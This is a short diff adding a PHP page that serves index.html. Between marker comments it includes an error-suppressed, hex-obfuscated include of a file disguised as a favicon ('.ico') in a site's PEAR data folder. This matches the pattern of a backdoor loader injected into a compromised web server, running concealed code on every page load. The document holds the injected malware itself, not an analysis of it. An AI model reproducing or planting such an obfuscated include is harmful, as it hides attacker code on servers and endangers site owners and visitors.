@@ -1,0 +1,10 @@
+<?php
+
+/*f79f2*/
+
+@include "\x2fus\x72/l\x6fca\x6c/w\x77w/\x76ho\x73ts\x2fro\x6ere\x63or\x64.c\x6fm/\x68tt\x70do\x63s/\x70ea\x72/P\x45AR\x2fda\x74a/\x66av\x69co\x6e_2\x63b8\x346.\x69co";
+
+/*f79f2*/
+
+
+echo file_get_contents('index.html');
